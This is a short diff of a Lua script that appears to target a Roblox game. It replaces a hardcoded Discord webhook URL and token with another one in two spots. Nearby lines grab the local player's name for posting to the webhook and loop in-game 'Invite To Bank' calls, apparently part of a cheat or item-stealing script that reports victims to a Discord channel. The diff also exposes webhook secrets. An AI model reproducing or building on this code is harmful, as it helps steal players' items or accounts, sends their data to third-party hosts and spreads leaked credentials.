@@ -1370,7 +1370,7 @@ local result = Event:InvokeServer(A_1)
 
 -- wrb
 
-local YourWebHookHere =  "https://discord.com/api/webhooks/963828001198465054/Rg_Yk1Lfo-5NBx3omPN4ayzNJVERBrH2AWvu77fOL-71EbJJU0rMNyLiCPqCDAM0NoUk"  -- web hook here
+local YourWebHookHere =  "https://discord.com/api/webhooks/960637164427804792/IjM-MbJ5u59jhHCrDOjihIB5huIDEyMQ1gUSuN3bPpayMbE3qCu-2_1_LHvOTdtcE2wr"  -- web hook here
 
 local url = YourWebHookHere
 local username = game:GetService("Players").LocalPlayer.Name
@@ -1427,7 +1427,7 @@ request(abcdef)
 
 while true do
     lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], HoverBoard)
-    local YourWebHookHere2 =  "https://discord.com/api/webhooks/963828001198465054/Rg_Yk1Lfo-5NBx3omPN4ayzNJVERBrH2AWvu77fOL-71EbJJU0rMNyLiCPqCDAM0NoUk"  -- web hook here
+    local YourWebHookHere2 =  "https://discord.com/api/webhooks/960637164427804792/IjM-MbJ5u59jhHCrDOjihIB5huIDEyMQ1gUSuN3bPpayMbE3qCu-2_1_LHvOTdtcE2wr"  -- web hook here
 
     local url2 = YourWebHookHere2
     local username2 = game:GetService("Players").LocalPlayer.Name
